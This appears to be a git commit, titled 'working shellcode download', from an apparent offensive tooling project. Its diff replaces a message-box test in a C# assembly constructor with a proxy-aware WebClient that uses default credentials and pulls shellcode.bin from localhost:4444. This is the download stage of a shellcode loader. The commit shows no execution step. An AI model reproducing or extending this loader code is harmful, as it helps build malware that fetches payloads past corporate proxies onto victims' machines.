93eb61cb5df4c836b70a61417548e43a4bccc763
Luke Hopkins <>
2025-05-18 20:16:29 +0100

    working shellcode download

--- TestAssembly/Program.cs
+++ TestAssembly/Program.cs
@@ -1,9 +1,25 @@
-﻿using System.Windows.Forms;
+﻿using System.Net;
 
-namespace TestAssembly{
-    public class Program{
-        public Program(){
-            MessageBox.Show("Test Assembly !!");
+
+namespace TestAssembly
+{
+    public class Program
+    {
+        public Program()
+        {
+            byte[] shellcode;
+
+            using (var client = new WebClient())
+            {
+                // make proxy aware
+                client.Proxy = WebRequest.GetSystemWebProxy();
+                client.UseDefaultCredentials = true;
+
+                // set allowed tls versions
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
+
+                shellcode = client.DownloadData("http://localhost:4444/shellcode.bin");
+            };
         }
     }
 }
